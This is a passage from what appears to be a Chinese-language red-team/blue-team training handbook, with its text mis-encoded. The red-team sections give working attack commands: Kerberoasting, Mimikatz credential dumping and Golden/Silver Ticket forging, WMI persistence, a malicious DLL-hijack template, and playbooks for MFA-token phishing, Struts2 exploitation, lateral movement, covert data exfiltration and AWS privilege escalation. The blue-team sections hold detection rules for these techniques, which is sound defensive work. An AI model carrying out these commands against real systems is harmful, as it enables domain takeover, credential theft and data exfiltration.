Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.com:1433"

# å¯¼å‡ºç¥¨æ®
Invoke-Mimikatz -Command '"kerberos::list /export"'

# ç¦»çº¿ç ´è§£
# ä½¿ç”¨Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# ä½¿ç”¨Impacket
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.com/user:password

# Hashcatç ´è§£
hashcat -m 13100 hashes.txt wordlist.txt
</code></pre>
<p><strong>Golden Ticketæ”»å‡»</strong>:</p>
<pre><code class="language-powershell"># 1. æå–krbtgtå“ˆå¸Œ
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.com /user:krbtgt"'

# 2. è·å–åŸŸSID
Get-ADDomain | Select-Object DomainSID

# 3. ç”ŸæˆGolden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ptt"'

# 4. éªŒè¯è®¿é—®
dir \\dc\c$
</code></pre>
<p><strong>Silver Ticketæ”»å‡»</strong>:</p>
<pre><code class="language-powershell"># ç”Ÿæˆç‰¹å®šæœåŠ¡ç¥¨æ®
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:machine_ntlm_hash /ptt"'

# è®¿é—®ç›®æ ‡æœåŠ¡
dir \\server\c$
</code></pre>
<h3 id="25-æŒä¹…åŒ–æŠ€æœ¯"><a class="header" href="#25-æŒä¹…åŒ–æŠ€æœ¯">2.5 æŒä¹…åŒ–æŠ€æœ¯</a></h3>
<h4 id="windowsæŒä¹…åŒ–"><a class="header" href="#windowsæŒä¹…åŒ–">WindowsæŒä¹…åŒ–</a></h4>
<p><strong>WMIäº‹ä»¶è®¢é˜…</strong>:</p>
<pre><code class="language-powershell"># åˆ›å»ºWMIæŒä¹…åŒ–
$FilterArgs = @{
    name='SystemBootFilter'
    EventNameSpace='root\CimV2'
    QueryLanguage='WQL'
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{
    name='SystemBootConsumer'
    CommandLineTemplate='powershell.exe -NoP -W Hidden -Exec Bypass -enc &lt;base64_payload&gt;'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs

# æ¸…ç†WMIæŒä¹…åŒ–ï¼ˆç”¨äºæµ‹è¯•åæ¸…ç†ï¼‰
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemBootFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemBootConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
</code></pre>
<p><strong>DLLåŠ«æŒ</strong>:</p>
<pre><code class="language-c">// æ¶æ„DLLæ¨¡æ¿
#include &lt;windows.h&gt;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // æ‰§è¡Œæ¶æ„ä»£ç 
            system("powershell.exe -enc &lt;base64_payload&gt;");

            // åŠ è½½åŸå§‹DLLï¼ˆé¿å…ç¨‹åºå´©æºƒï¼‰
            LoadLibrary("C:\\Windows\\System32\\original_dll.dll");
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// å¯¼å‡ºåŸDLLçš„æ‰€æœ‰å‡½æ•°ï¼ˆä½¿ç”¨.defæ–‡ä»¶ï¼‰
/*
LIBRARY malicious_dll
EXPORTS
    Function1=original_dll.Function1
    Function2=original_dll.Function2
*/

// ç¼–è¯‘
// x86: cl /LD /D_USRDLL /D_WINDLL malicious.cpp /link /DEF:exports.def
// x64: cl /LD /D_USRDLL /D_WINDLL malicious.cpp /link /MACHINE:X64 /DEF:exports.def
</code></pre>
<h3 id="26-çº¢é˜Ÿæ”»å‡»å‰§æœ¬åº“playbook-library"><a class="header" href="#26-çº¢é˜Ÿæ”»å‡»å‰§æœ¬åº“playbook-library">2.6 çº¢é˜Ÿæ”»å‡»å‰§æœ¬åº“ï¼ˆPlaybook Libraryï¼‰</a></h3>
<blockquote>
<p>æ‰€æœ‰å‰§æœ¬ä»…ç”¨äºæˆæƒæ¼”ç»ƒï¼Œè¯·åœ¨éš”ç¦»ç¯å¢ƒä¸­ç»ƒä¹ ã€‚</p>
</blockquote>
<h4 id="å‰§æœ¬-rt-001é’“é±¼--vpn-å‡­è¯æ»¥ç”¨--å†…ç½‘æ¸—é€"><a class="header" href="#å‰§æœ¬-rt-001é’“é±¼--vpn-å‡­è¯æ»¥ç”¨--å†…ç½‘æ¸—é€">å‰§æœ¬ #RT-001ï¼šé’“é±¼ â†’ VPN å‡­è¯æ»¥ç”¨ â†’ å†…ç½‘æ¸—é€</a></h4>
<div class="table-wrapper"><table><thead><tr><th>é˜¶æ®µ</th><th>ç›®æ ‡</th><th>å·¥å…·/å‘½ä»¤</th><th>äº§å‡º</th><th>å®‰å…¨é˜ˆå€¼</th></tr></thead><tbody>
<tr><td>Recon</td><td>æ”¶é›†ç»„ç»‡é‚®ç®±æ ¼å¼ã€æŠ€æœ¯æ ˆ</td><td><code>theHarvester -d corp.com -b linkedin</code></td><td>é‚®ç®±åˆ—è¡¨ã€èŒä½ä¿¡æ¯</td><td>ä¸ä¸»åŠ¨è§¦è¾¾ç›®æ ‡èµ„äº§</td></tr>
<tr><td>Weaponize</td><td>åˆ¶ä½œé’“é±¼é¡µé¢ã€å‡­è¯è½¬å‘</td><td>Gophishã€Evilginx2</td><td>é’“é±¼ç«™ç‚¹ã€SSLè¯ä¹¦</td><td>é’“é±¼åŸŸåä¸ç”Ÿäº§åŸŸåç›¸ä¼¼åº¦æ§åˆ¶ &lt;80%</td></tr>
<tr><td>Delivery</td><td>æ‰¹é‡å‘é€ä¸ªæ€§åŒ–é‚®ä»¶</td><td>Gophishæ´»åŠ¨</td><td>å‘ä¿¡æ—¥å¿—ã€æ‰“å¼€ç‡</td><td>å•æ‰¹æ¬¡ä¸è¶…è¿‡50å°</td></tr>
<tr><td>Exploit</td><td>æ•è·å‡­è¯ + MFA Token</td><td>Evilginx2æ—¥å¿—</td><td>æœ‰æ•ˆç™»å½•å‡­è¯</td><td>é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°&lt;3</td></tr>
<tr><td>Installation</td><td>ä½¿ç”¨å‡­è¯ç™»å½•VPN</td><td><code>openvpn --config corp.ovpn --auth-user-pass creds.txt</code></td><td>VPNä¼šè¯æ—¥å¿—ã€IP</td><td>ç™»å½•åç«‹å³é€šçŸ¥ç™½é˜Ÿ</td></tr>
<tr><td>C2</td><td>éƒ¨ç½²Beacon</td><td><code>beacon.exe</code> / <code>powershell -enc ...</code></td><td>å—æ§ä¸»æœº</td><td>Beaconå¿ƒè·³é—´éš”â‰¥60s</td></tr>
<tr><td>Action</td><td>æ¨ªå‘æ¸—é€ã€æ•°æ®è®¿é—®</td><td>BloodHoundã€CrackMapExecã€Rubeus</td><td>å‡­è¯ã€æ‹“æ‰‘ã€æ•°æ®åŒ…</td><td>å¯¹æ•æ„Ÿæ•°æ®åº“ä»…åªè¯»</td></tr>
</tbody></table>
</div>
<p><strong>å…³é”®æ—¥å¿—æ ·ä¾‹</strong>ï¼š</p>
<pre><code>2024-04-12 10:21:33 [phish] Email opened by alice@corp.com
2024-04-12 10:21:45 [phish] Credential submitted: alice@corp.com / ********
2024-04-12 10:22:06 [evilginx] Captured MFA token: 123456
2024-04-12 10:22:50 [vpn] New connection from 45.77.x.x user alice
</code></pre>
<p><strong>å›æ»šè®¡åˆ’</strong>ï¼š</p>
<ol>
<li>ç»ˆæ­¢VPNä¼šè¯ï¼›</li>
<li>æäº¤å‡­è¯é‡ç½®æ¸…å•ï¼›</li>
<li>åˆ é™¤é’“é±¼ç«™ç‚¹ã€é”€æ¯C2å®ä¾‹ï¼›</li>
<li>æ›´æ–°æ¼”ç»ƒè¯æ®ã€‚</li>
</ol>
<h4 id="å‰§æœ¬-rt-002webæ¼æ´é“¾--å†…ç½‘è·³æ¿--æ•°æ®æ¸—å‡º"><a class="header" href="#å‰§æœ¬-rt-002webæ¼æ´é“¾--å†…ç½‘è·³æ¿--æ•°æ®æ¸—å‡º">å‰§æœ¬ #RT-002ï¼šWebæ¼æ´é“¾ â†’ å†…ç½‘è·³æ¿ â†’ æ•°æ®æ¸—å‡º</a></h4>
<div class="table-wrapper"><table><thead><tr><th>æ­¥éª¤</th><th>æ“ä½œ</th><th>å‘½ä»¤/è„šæœ¬</th><th>é¢„æœŸç»“æœ</th></tr></thead><tbody>
<tr><td>1. ä¿¡æ¯æ”¶é›†</td><td>ç¡®è®¤Webç»„ä»¶ä¸æ¡†æ¶</td><td><code>whatweb -a 3 portal.corp.com</code></td><td>è¯†åˆ«åˆ°Struts2ç»„ä»¶</td></tr>
<tr><td>2. æ¼æ´åˆ©ç”¨</td><td>åˆ©ç”¨CVE-2017-5638æ‰§è¡Œå‘½ä»¤</td><td><code>python exploit.py --url https://portal.corp.com --cmd "whoami"</code></td><td>æ‹¿åˆ°WebShell</td></tr>
<tr><td>3. æƒé™æå‡</td><td>æŸ¥æ‰¾æ•æ„Ÿé…ç½®</td><td><code>grep -R "password" /opt/app/conf</code></td><td>è·å–æ•°æ®åº“è´¦æˆ·</td></tr>
<tr><td>4. å†…ç½‘é€è§†</td><td>é€šè¿‡æ•°æ®åº“æœåŠ¡å™¨æ¨ªå‘</td><td><code>sshpass -p 'Passw0rd' ssh db@10.10.20.5</code></td><td>è¿›å…¥å†…ç½‘</td></tr>
<tr><td>5. å‡­è¯æ”¶é›†</td><td>Mimikatz/Seatbelt</td><td><code>Invoke-Mimikatz -Command "sekurlsa::logonpasswords"</code></td><td>åŸŸå‡­è¯</td></tr>
<tr><td>6. æ¨ªå‘ç§»åŠ¨</td><td>PsExec/WMI</td><td><code>wmiexec.py domain/admin:hash@10.10.20.10</code></td><td>è¿›å…¥æ–‡ä»¶æœåŠ¡å™¨</td></tr>
<tr><td>7. æ•°æ®æ¸—å‡º</td><td>å‹ç¼©å¹¶ä¼ å‡º</td><td><code>7z a finance.7z /data/finance/*.xls</code> + <code>powershell Invoke-WebRequest</code></td><td>æ•°æ®æ ·æœ¬</td></tr>
</tbody></table>
</div>
<p><strong>éšè”½æªæ–½</strong>ï¼šä½¿ç”¨<code>netsh interface portproxy</code>æ­å»ºè½¬å‘ã€<code>certutil -encode</code>ä¼ªè£…payloadã€åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€æ§åˆ¶æ•°æ®å¤§å°&lt;10MBå¹¶åˆ†ç‰‡ã€‚</p>
<h4 id="å‰§æœ¬-rt-003äº‘ç¯å¢ƒæ”»é™·aws"><a class="header" href="#å‰§æœ¬-rt-003äº‘ç¯å¢ƒæ”»é™·aws">å‰§æœ¬ #RT-003ï¼šäº‘ç¯å¢ƒæ”»é™·ï¼ˆAWSï¼‰</a></h4>
<ol>
<li>è·å–å‡­è¯ï¼šåœ¨Gitæ³„éœ²ä»“åº“ä¸­æ‰¾åˆ°<code>AWS_ACCESS_KEY_ID</code>ä¸<code>AWS_SECRET_ACCESS_KEY</code>ã€‚</li>
<li>èº«ä»½éªŒè¯ï¼š<code>aws sts get-caller-identity --profile compromised</code>ã€‚</li>
<li>æƒé™æšä¸¾ï¼š<code>aws iam list-attached-user-policies --user-name compromised-user</code>ã€‚</li>
<li>èµ„æºæ¢ç´¢ï¼š<code>aws s3 ls</code>ã€<code>aws ec2 describe-instances</code>ã€<code>aws lambda list-functions</code>ã€‚</li>
<li>æƒé™æå‡ï¼š<code>aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name RedTeamSession</code>ã€‚</li>
<li>æŒä¹…åŒ–ï¼šåˆ›å»ºçŸ­æœŸTokenæˆ–Access Keyï¼ˆéœ€ç™»è®°ï¼‰ï¼Œè®¾ç½®CloudTrailå‘Šè­¦ã€‚</li>
<li>æ¸…ç†ï¼šåˆ é™¤å¤šä½™èµ„æºï¼Œç”±ç™½é˜Ÿæ ¸å¯¹CloudTrailæ—¥å¿—ã€‚</li>
</ol>
<h4 id="å‰§æœ¬-rt-004å·¥æ§otåœºæ™¯ä»¿çœŸ"><a class="header" href="#å‰§æœ¬-rt-004å·¥æ§otåœºæ™¯ä»¿çœŸ">å‰§æœ¬ #RT-004ï¼šå·¥æ§/OTåœºæ™¯ï¼ˆä»¿çœŸï¼‰</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ç¯èŠ‚</th><th>ç›®æ ‡</th><th>æ“ä½œ</th><th>æ³¨æ„äº‹é¡¹</th></tr></thead><tbody>
<tr><td>ITä¾§æ¸—é€</td><td>è¿›å…¥å ¡å’æœºæˆ–MESç³»ç»Ÿ</td><td>Webæ¼æ´/é’“é±¼</td><td>ä½¿ç”¨ä»¿çœŸç¯å¢ƒï¼Œç¦æ­¢å½±å“ç”Ÿäº§</td></tr>
<tr><td>OTç½‘ç»œé€è§†</td><td>è¯†åˆ«PLCå·¥ç¨‹ç«™</td><td><code>nmap -sU -p 502,20000 10.60.0.0/24</code></td><td>ä»…å¯¹ä»¿çœŸç«™ç‚¹æ‰«æï¼Œå¹¶æå‰å¤‡æ¡ˆ</td></tr>
<tr><td>åè®®åˆ†æ</td><td>Modbus/TCPè¯»å–çº¿åœˆ</td><td><code>python modbus-read.py --host 10.60.0.10 --addr 1 --count 10</code></td><td>ç¦æ­¢å†™å‘½ä»¤ã€æ“ä½œå‰ç¡®è®¤</td></tr>
<tr><td>æ•°æ®å–è¯</td><td>å¯¼å‡ºå·¥è‰ºå›¾çº¸</td><td>åªè®¿é—®æ•™å­¦ç”¨æ–‡ä»¶å¤¹</td><td>å¿…é¡»æœ‰ç°åœºå·¥ç¨‹å¸ˆé™ªåŒ</td></tr>
</tbody></table>
</div>
<h3 id="27-çº¢é˜ŸçŸ¥è¯†åº“å»ºè®¾"><a class="header" href="#27-çº¢é˜ŸçŸ¥è¯†åº“å»ºè®¾">2.7 çº¢é˜ŸçŸ¥è¯†åº“å»ºè®¾</a></h3>
<ul>
<li>å»ºç«‹<code>/redteam/playbooks</code>ä»“åº“ï¼ŒæŒ‰ç…§<code>å¹´ä»½-åœºæ™¯</code>å‘½åå¹¶ç»´æŠ¤CHANGELOGã€‚</li>
<li>æ¯ä¸ªå‰§æœ¬åŒ…å«ï¼šç›®æ ‡èƒŒæ™¯ã€å‰ææ¡ä»¶ã€æ“ä½œæ­¥éª¤ã€å‘½ä»¤ã€é£é™©ã€æ£€æµ‹å‡è®¾ã€å›æ»šæ–¹æ¡ˆã€‚</li>
<li>ä¸è“é˜ŸåŒæ­¥â€œæ£€æµ‹å‡è®¾â€éƒ¨åˆ†ï¼Œä¾¿äºå¯¹é½é¢„æœŸå‘Šè­¦ç‚¹ã€‚</li>
<li>å®šæœŸå¤ç›˜å‰§æœ¬æ•ˆæœï¼Œæ ‡è®°â€œæˆåŠŸ/å¤±è´¥/éœ€ä¼˜åŒ–â€ï¼Œå½¢æˆç‰ˆæœ¬å†å²ã€‚</li>
</ul>
<hr />
<h2 id="æ¨¡å—ä¸‰è“é˜Ÿé˜²å¾¡ä½“ç³»"><a class="header" href="#æ¨¡å—ä¸‰è“é˜Ÿé˜²å¾¡ä½“ç³»">æ¨¡å—ä¸‰ï¼šè“é˜Ÿé˜²å¾¡ä½“ç³»</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆè“é˜Ÿè§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆè“é˜Ÿè§†è§’">æ¨¡å—æ€»è§ˆï¼ˆè“é˜Ÿè§†è§’ï¼‰</a></h3>
<ul>
<li><strong>å…³é”®ç›®æ ‡</strong>ï¼šæ„å»ºæ¶µç›–æ£€æµ‹ã€å“åº”ã€å¤ç›˜ã€æ”¹è¿›çš„é—­ç¯ä½“ç³»ï¼Œå®ç°å¯¹çº¢é˜ŸTTPçš„é«˜è¦†ç›–ã€é«˜å‘½ä¸­ä¸ä½è¯¯æŠ¥ã€‚</li>
<li><strong>èƒ½åŠ›è¦ç´ </strong>ï¼š
<ul>
<li><strong>æ£€æµ‹å·¥ç¨‹ï¼ˆDetection Engineeringï¼‰</strong>ï¼šåŸºäºMITRE &amp; ATT&amp;CKè¦†ç›–ç‡è®¾è®¡è§„åˆ™ã€ä»ªè¡¨æ¿ã€‚</li>
<li><strong>å¨èƒç‹©çŒï¼ˆThreat Huntingï¼‰</strong>ï¼šå‡è®¾é©±åŠ¨ã€æ•°æ®é©±åŠ¨ã€æƒ…æŠ¥é©±åŠ¨ä¸‰ç§æ¨¡å¼å¹¶è¡Œã€‚</li>
<li><strong>åº”æ€¥å“åº”ï¼ˆIRï¼‰</strong>ï¼šNISTæµç¨‹ã€Playbookã€è‡ªåŠ¨åŒ–ç¼–æ’ï¼ˆSOARï¼‰ã€‚</li>
<li><strong>å–è¯åˆ†æ</strong>ï¼šå†…å­˜/ç£ç›˜/ç½‘ç»œ/æ—¥å¿—å¤šç»´å–è¯èƒ½åŠ›ã€‚</li>
</ul>
</li>
<li><strong>æ¨¡å—äº§å‡º</strong>ï¼š
<ul>
<li>æ£€æµ‹è§„åˆ™åº“ï¼ˆSigma/YARA/EDRè‡ªå®šä¹‰è§„åˆ™ï¼‰</li>
<li>SOCè¿è¡Œæ‰‹å†Œã€å‘Šè­¦åˆ†çº§æ ‡å‡†ã€å€¼ç­æ’ç­è¡¨</li>
<li>Threat Hunting æŠ¥å‘Šæ¨¡æ¿ä¸è‡ªåŠ¨åŒ–è„šæœ¬</li>
<li>äº‹ä»¶å¤ç›˜æŠ¥å‘Šã€è¡ŒåŠ¨é¡¹è·Ÿè¸ªè¡¨</li>
</ul>
</li>
</ul>
<h4 id="è“é˜Ÿèƒ½åŠ›é›·è¾¾å›¾è‡ªè¯„"><a class="header" href="#è“é˜Ÿèƒ½åŠ›é›·è¾¾å›¾è‡ªè¯„">è“é˜Ÿèƒ½åŠ›é›·è¾¾å›¾ï¼ˆè‡ªè¯„ï¼‰</a></h4>
<div class="table-wrapper"><table><thead><tr><th>èƒ½åŠ›é¡¹</th><th>1åˆ†</th><th>3åˆ†</th><th>5åˆ†</th></tr></thead><tbody>
<tr><td>å¯è§æ€§ï¼ˆVisibilityï¼‰</td><td>å…³é”®æ—¥å¿—ç¼ºå¤±</td><td>ä¸»è¦ç³»ç»Ÿæ¥å…¥æ—¥å¿—å¹³å°</td><td>å…¨é‡æ—¥å¿—è¦†ç›–+èµ„äº§æ ‡ç­¾</td></tr>
<tr><td>æ£€æµ‹ç²¾åº¦</td><td>å¤§é‡è¯¯æŠ¥</td><td>å…³é”®è¡Œä¸ºæœ‰è§„åˆ™</td><td>æ•°æ®ç§‘å­¦+æƒ…æŠ¥é©±åŠ¨åŠ¨æ€æ›´æ–°</td></tr>
<tr><td>å“åº”é€Ÿåº¦</td><td>&gt;24å°æ—¶</td><td>4-8å°æ—¶</td><td>&lt;1å°æ—¶è‡ªåŠ¨åŒ–å“åº”</td></tr>
<tr><td>è‡ªåŠ¨åŒ–æ°´å¹³</td><td>æ‰‹å·¥å¤„ç†</td><td>åŠè‡ªåŠ¨ç¼–æ’</td><td>SOARé—­ç¯è”åŠ¨</td></tr>
<tr><td>å–è¯èƒ½åŠ›</td><td>å•ä¸€ç»ˆç«¯</td><td>å¤šæºå–è¯</td><td>äº‘/å®¹å™¨/å·¥æ§å…¨è¦†ç›–</td></tr>
</tbody></table>
</div>
<blockquote>
<p>æ¯å­£åº¦æ ¹æ®æ¼”ç»ƒç»“æœæ›´æ–°è¯„åˆ†ï¼Œç»“åˆçº¢é˜Ÿåé¦ˆå»ºç«‹â€œé˜²å¾¡è¿­ä»£Backlogâ€ã€‚</p>
</blockquote>
<h3 id="31-å¨èƒæ£€æµ‹"><a class="header" href="#31-å¨èƒæ£€æµ‹">3.1 å¨èƒæ£€æµ‹</a></h3>
<h4 id="siemç³»ç»Ÿéƒ¨ç½²"><a class="header" href="#siemç³»ç»Ÿéƒ¨ç½²">SIEMç³»ç»Ÿéƒ¨ç½²</a></h4>
<p><strong>Splunké…ç½®</strong>:</p>
<pre><code class="language-bash"># å®‰è£…Splunk
wget -O splunk-9.0.0-linux-x86_64.tgz 'https://download.splunk.com/...'
tar xvzf splunk-9.0.0-linux-x86_64.tgz -C /opt
cd /opt/splunk/bin
./splunk start --accept-license

# é…ç½®æ•°æ®è¾“å…¥
[monitor:///var/log/auth.log]
disabled = false
index = linux_security
sourcetype = linux_secure

[monitor:///var/log/syslog]
disabled = false
index = linux_os
sourcetype = syslog

# Windowsæ—¥å¿—æ”¶é›†
[WinEventLog://Security]
disabled = false
index = windows_security
checkpointInterval = 5

[WinEventLog://System]
disabled = false
index = windows_system
checkpointInterval = 5

# Sysmoné…ç½®
&lt;Sysmon schemaversion="4.82"&gt;
  &lt;EventFiltering&gt;
    &lt;!-- è¿›ç¨‹åˆ›å»ºç›‘æ§ --&gt;
    &lt;ProcessCreate onmatch="include"&gt;
      &lt;CommandLine condition="contains"&gt;powershell&lt;/CommandLine&gt;
      &lt;CommandLine condition="contains"&gt;cmd&lt;/CommandLine&gt;
      &lt;CommandLine condition="contains"&gt;wscript&lt;/CommandLine&gt;
    &lt;/ProcessCreate&gt;

    &lt;!-- ç½‘ç»œè¿æ¥ç›‘æ§ --&gt;
    &lt;NetworkConnect onmatch="include"&gt;
      &lt;DestinationPort condition="is"&gt;4444&lt;/DestinationPort&gt;
      &lt;DestinationPort condition="is"&gt;5555&lt;/DestinationPort&gt;
    &lt;/NetworkConnect&gt;

    &lt;!-- æ–‡ä»¶åˆ›å»ºç›‘æ§ --&gt;
    &lt;FileCreate onmatch="include"&gt;
      &lt;TargetFilename condition="contains"&gt;\Temp\&lt;/TargetFilename&gt;
      &lt;TargetFilename condition="contains"&gt;\AppData\&lt;/TargetFilename&gt;
    &lt;/FileCreate&gt;
  &lt;/EventFiltering&gt;
&lt;/Sysmon&gt;
</code></pre>
<p><strong>Splunkæ£€æµ‹è§„åˆ™</strong>:</p>
<pre><code class="language-spl"># æ£€æµ‹Mimikatzä½¿ç”¨
index=windows_security EventCode=4688
(CommandLine="*mimikatz*" OR CommandLine="*sekurlsa*" OR CommandLine="*lsadump*")
| stats count by Computer, User, CommandLine
| where count &gt; 0

# æ£€æµ‹Pass-the-Hash
index=windows_security EventCode=4624 LogonType=3
| stats dc(SourceNetworkAddress) as unique_sources by TargetUserName
| where unique_sources &gt; 10

# æ£€æµ‹PowerShellæ··æ·†
index=windows_security EventCode=4104
(ScriptBlockText="*-enc*" OR ScriptBlockText="*FromBase64String*" OR ScriptBlockText="*Invoke-Expression*")
| stats count by Computer, ScriptBlockText
| head 20

# æ£€æµ‹å¼‚å¸¸ç½‘ç»œè¿æ¥
index=sysmon EventCode=3
DestinationPort IN (4444, 5555, 6666, 7777)
| stats count by SourceIp, DestinationIp, DestinationPort
| where count &gt; 5

# æ£€æµ‹Kerberoasting
index=windows_security EventCode=4769 TicketEncryptionType=0x17
| stats count by TargetUserName, ServiceName
| where count &gt; 10

# æ£€æµ‹Golden Ticket
index=windows_security EventCode=4624 LogonType=3
TargetUserName="Administrator"
| stats dc(SourceNetworkAddress) as unique_ips by TargetUserName
| where unique_ips &gt; 20
</code></pre>
<h4 id="elk-stackéƒ¨ç½²"><a class="header" href="#elk-stackéƒ¨ç½²">ELK Stackéƒ¨ç½²</a></h4>
<p><strong>Elasticsearché…ç½®</strong>:</p>
<pre><code class="language-yaml"># elasticsearch.yml
cluster.name: security-monitoring
node.name: elk-node-1
path.data: /var/lib/elasticsearch
path.logs: /var/log/elasticsearch
network.host: 0.0.0.0
http.port: 9200
discovery.type: single-node

xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
</code></pre>
<p><strong>Logstashé…ç½®</strong>:</p>
<pre><code class="language-ruby"># logstash.conf
input {
  beats {
    port =&gt; 5044
  }

  syslog {
    port =&gt; 514
    type =&gt; "syslog"
  }
}

filter {
  # Windowsäº‹ä»¶æ—¥å¿—è§£æ
  if [winlog][event_id] == 4624 {
    mutate {
      add_tag =&gt; ["windows_logon"]
    }
  }

  if [winlog][event_id] == 4688 {
    mutate {
      add_tag =&gt; ["process_creation"]
    }

    # æ£€æµ‹å¯ç–‘è¿›ç¨‹
    if [winlog][event_data][CommandLine] =~ /mimikatz|sekurlsa|powershell.*-enc/ {
      mutate {
        add_tag =&gt; ["suspicious_process"]
      }
    }
  }

  # Sysmonè§£æ
  if [winlog][channel] == "Microsoft-Windows-Sysmon/Operational" {
    if [winlog][event_id] == 1 {
      mutate { add_tag =&gt; ["sysmon_process_create"] }
    }

    if [winlog][event_id] == 3 {
      mutate { add_tag =&gt; ["sysmon_network_connect"] }

      # æ£€æµ‹C2é€šä¿¡
      if [winlog][event_data][DestinationPort] in [4444, 5555, 6666] {
        mutate { add_tag =&gt; ["potential_c2"] }
      }
    }
  }

  # GeoIPå¯ŒåŒ–
  geoip {
    source =&gt; "src_ip"
    target =&gt; "geoip"
  }
}

output {
  elasticsearch {
    hosts =&gt; ["localhost:9200"]
    index =&gt; "security-logs-%{+YYYY.MM.dd}"
    user =&gt; "elastic"
    password =&gt; "password"
  }
}
</code></pre>
<p><strong>Kibanaå‘Šè­¦è§„åˆ™</strong>:</p>
<pre><code class="language-json">{
  "name": "Mimikatzæ£€æµ‹",
  "type": "query",
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "winlog.event_id": "4688"
          }
        },
        {
          "query_string": {
            "query": "CommandLine:(*mimikatz* OR *sekurlsa* OR *lsadump*)"
          }
        }
      ]
    }
  },
  "actions": [
    {
      "type": "email",
      "to": ["soc@company.com"],
      "subject": "é«˜å±å‘Šè­¦ï¼šæ£€æµ‹åˆ°Mimikatzæ´»åŠ¨",
      "body": "ä¸»æœº {{ctx.payload.hits.hits.0._source.Computer}} æ£€æµ‹åˆ°Mimikatzä½¿ç”¨"
    },
    {
      "type": "webhook",
      "url": "https://siem.company.com/api/alerts",
      "method": "POST",
      "body": "{{ctx.payload}}"
    }
  ],
  "schedule": {
    "interval": "1m"
  }
}
</code></pre>
<h3 id="æ£€æµ‹å·¥ç¨‹å·¥ä½œæµdetection-engineering-workflow"><a class="header" href="#æ£€æµ‹å·¥ç¨‹å·¥ä½œæµdetection-engineering-workflow">æ£€æµ‹å·¥ç¨‹å·¥ä½œæµï¼ˆDetection Engineering Workflowï¼‰</a></h3>
<ol>
<li><strong>éœ€æ±‚é©±åŠ¨</strong>ï¼šæ ¹æ®çº¢é˜ŸTTPã€å¨èƒæƒ…æŠ¥ã€æ¼æ´å…¬å‘Šã€åˆè§„è¦æ±‚è¾“å‡ºæ£€æµ‹éœ€æ±‚æ–‡æ¡£ï¼ˆDRDï¼‰ã€‚</li>
<li><strong>è§„åˆ™å¼€å‘</strong>ï¼šä½¿ç”¨Sigma/YARA/è‡ªå®šä¹‰è„šæœ¬ç¼–å†™è§„åˆ™ï¼Œå®šä¹‰é˜ˆå€¼ã€å­—æ®µæ˜ å°„ã€æ’é™¤æ¡ä»¶ã€‚</li>
<li><strong>å®éªŒéªŒè¯</strong>ï¼šåœ¨æ²™ç®±æˆ–æµ‹è¯•é›†ç¾¤å¤ç°çº¢é˜Ÿè¡Œä¸ºï¼ŒéªŒè¯è§„åˆ™å‘½ä¸­ç‡ä¸è¯¯æŠ¥ç‡ï¼Œè®°å½•æµ‹è¯•æ•°æ®ä¸æ—¥å¿—æ ·æœ¬ã€‚</li>
<li><strong>ä¸Šçº¿è¯„å®¡</strong>ï¼šè“é˜ŸLead + ç´«é˜Ÿä»£è¡¨è¯„å®¡ï¼Œç¡®è®¤è§„åˆ™æè¿°ã€å‘Šè­¦çº§åˆ«ã€å“åº”æŒ‡å—ï¼›å¿…è¦æ—¶ç”±ç™½é˜Ÿç­¾å­—å½’æ¡£ã€‚</li>
<li><strong>éƒ¨ç½²ä¸ç›‘æ§</strong>ï¼šé€šè¿‡CI/CDæˆ–SOARè‡ªåŠ¨å‘å¸ƒï¼Œè®¾ç½®è§‚å¯ŸæœŸç›‘æ§è¯¯æŠ¥ï¼Œå¿…è¦æ—¶å›æ»šæˆ–è°ƒæ•´ï¼›æ‰€æœ‰å˜æ›´å†™å…¥Changelogã€‚</li>
<li><strong>çŸ¥è¯†åº“æ²‰æ·€</strong>ï¼šå°†è§„åˆ™ã€æ¡ˆä¾‹ã€æ—¥å¿—æ ·æœ¬çº³å…¥æ£€æµ‹çŸ¥è¯†åº“ï¼Œä¸çº¢é˜Ÿå…±äº«ç”¨äºä¸‹ä¸€è½®æ¼”ç»ƒä½è¯æ£€æµ‹æ•ˆæœã€‚</li>
</ol>
<h4 id="æ£€æµ‹è¦†ç›–çŸ©é˜µcoverage-matrix"><a class="header" href="#æ£€æµ‹è¦†ç›–çŸ©é˜µcoverage-matrix">æ£€æµ‹è¦†ç›–çŸ©é˜µï¼ˆCoverage Matrixï¼‰</a></h4>
